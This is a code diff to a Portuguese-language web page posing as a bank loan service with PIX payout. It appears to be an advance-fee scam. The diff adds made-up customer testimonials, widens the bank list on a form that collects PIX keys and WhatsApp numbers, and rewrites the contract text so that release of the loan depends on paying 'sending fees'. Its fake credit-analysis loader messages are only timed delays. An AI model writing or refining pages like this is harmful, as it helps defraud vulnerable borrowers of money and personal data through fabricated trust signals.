@@ -12,7 +12,6 @@
         .page.active { display: flex; animation: fadeIn 0.3s ease; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         
-        /* ESTILO BANCO */
         .header-banco { background-color: #1e3a8a; border-bottom: 4px solid #f97316; }
         .btn-emprestimo { background-color: #f97316; color: white; font-weight: 800; border-radius: 8px; padding: 1rem; font-size: 1.1rem; text-transform: uppercase; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
         .btn-emprestimo:active { transform: scale(0.98); background-color: #ea580c; }
@@ -59,13 +58,26 @@
             </div>
 
             <div class="space-y-3 mb-6">
-                <div class="bg-white p-3 rounded-lg border-l-4 border-blue-800 text-xs shadow-sm">
-                    <p class="font-bold text-slate-700">Maria Auxiliadora Silva</p>
-                    <p class="text-slate-500 italic">"Consegui o valor rápido, o sistema de segurança por TED é muito sério."</p>
+                <p class="text-[10px] font-extrabold text-slate-400 uppercase tracking-widest ml-1">Relatos de Clientes</p>
+                <div class="bg-white p-4 rounded-lg border border-slate-200 shadow-sm">
+                    <p class="font-bold text-slate-800 text-sm">Marcos Oliveira</p>
+                    <p class="text-slate-500 text-xs mt-1">"Processo muito rápido. O valor caiu na conta logo após a confirmação do protocolo."</p>
                 </div>
-                <div class="bg-white p-3 rounded-lg border-l-4 border-blue-800 text-xs shadow-sm">
-                    <p class="font-bold text-slate-700">Antônio J. Ferreira</p>
-                    <p class="text-slate-500 italic">"Gostei muito do atendimento. Tudo transparente."</p>
+                <div class="bg-white p-4 rounded-lg border border-slate-200 shadow-sm">
+                    <p class="font-bold text-slate-800 text-sm">Sandra Regina Costa</p>
+                    <p class="text-slate-500 text-xs mt-1">"Fiquei com receio no começo, mas o sistema é seguro e o atendimento é excelente."</p>
+                </div>
+                <div class="bg-white p-4 rounded-lg border border-slate-200 shadow-sm">
+                    <p class="font-bold text-slate-800 text-sm">Ricardo Mendes</p>
+                    <p class="text-slate-500 text-xs mt-1">"O melhor limite que já me ofereceram online. Recomendo a todos."</p>
+                </div>
+                <div class="bg-white p-4 rounded-lg border border-slate-200 shadow-sm">
+                    <p class="font-bold text-slate-800 text-sm">Aline Souza</p>
+                    <p class="text-slate-500 text-xs mt-1">"Muito prático de fazer pelo celular. A carência de 180 dias ajuda muito no planejamento."</p>
+                </div>
+                <div class="bg-white p-4 rounded-lg border border-slate-200 shadow-sm">
+                    <p class="font-bold text-slate-800 text-sm">João Pedro Cavalcante</p>
+                    <p class="text-slate-500 text-xs mt-1">"Consegui o crédito mesmo com score baixo. Nota 10 pelo serviço."</p>
                 </div>
             </div>
         </main>
@@ -128,7 +140,7 @@
                 <input type="text" id="pix_key" placeholder="Digite sua Chave PIX">
                 <select id="banco_user">
                     <option>Selecione seu Banco</option>
-                    <option>Nubank</option><option>Itaú</option><option>Bradesco</option><option>Inter</option><option>Caixa</option><option>Santander</option>
+                    <option>Nubank</option><option>Itaú</option><option>Bradesco</option><option>Inter</option><option>Caixa</option><option>Santander</option><option>C6 Bank</option><option>Banco do Brasil</option><option>Neon</option><option>PagBank</option>
                 </select>
                 <input type="tel" id="whatsapp_user" placeholder="Seu WhatsApp">
                 <button onclick="revisar()" class="btn-emprestimo w-full mt-4">Próximo Passo</button>
@@ -155,12 +167,12 @@
             <h2 class="text-lg font-bold text-blue-900 text-center mb-4 italic uppercase">Termos do Contrato</h2>
             <div class="h-64 overflow-y-scroll bg-slate-50 p-4 rounded-lg text-[10px] font-bold text-slate-400 leading-relaxed border mb-6">
                 <p class="mb-2 text-slate-700">1. DO OBJETO DO EMPRÉSTIMO</p>
-                <p>O presente contrato visa a liberação de crédito direto ao consumidor no valor selecionado.</p>
+                <p>O presente contrato visa a liberação de crédito direto ao consumidor no valor selecionado pelo contratante.</p>
                 <p class="mb-2 text-slate-700 mt-4">2. DA LIBERAÇÃO VIA PIX</p>
-                <p>A transferência será processada em tempo real após a validação do protocolo de segurança bancária e tarifas vigentes.</p>
+                <p>A transferência será processada em tempo real após a validação do protocolo de segurança bancária e recolhimento de tarifas de envio.</p>
                 <p class="mb-2 text-slate-700 mt-4">3. DA CARÊNCIA</p>
-                <p>O cliente terá o prazo de 180 dias para pagamento da primeira parcela do financiamento.</p>
-                <p>O aceite digital deste contrato possui validade jurídica em todo território nacional.</p>
+                <p>O cliente terá o prazo de 180 dias para pagamento da primeira parcela do financiamento, conforme escolha prévia.</p>
+                <p>Este documento eletrônico é firmado sob as leis de proteção de dados e assinaturas digitais brasileiras.</p>
             </div>
             <button onclick="iniciarEnvio()" class="btn-emprestimo w-full">Aceitar e Receber Agora</button>
         </div>
@@ -199,7 +211,7 @@
 
         function iniciarAnalise() {
             nextStep(2);
-            let phrases = ["Consultando Serasa...", "Verificando Score...", "Analisando CPF...", "Liberando Oferta..."];
+            let phrases = ["Validando Documentação...", "Consultando Base Interna...", "Verificando Margem...", "Aguardando Resposta..."];
             let i = 0;
             let int = setInterval(() => {
                 document.getElementById('loader-txt').innerText = phrases[i];
@@ -219,7 +231,7 @@
 
         function finalizarValor() {
             nextStep(2);
-            document.getElementById('loader-txt').innerText = "Validando Limite...";
+            document.getElementById('loader-txt').innerText = "Processando Solicitação...";
             setTimeout(() => nextStep(4), 5000);
         }
 
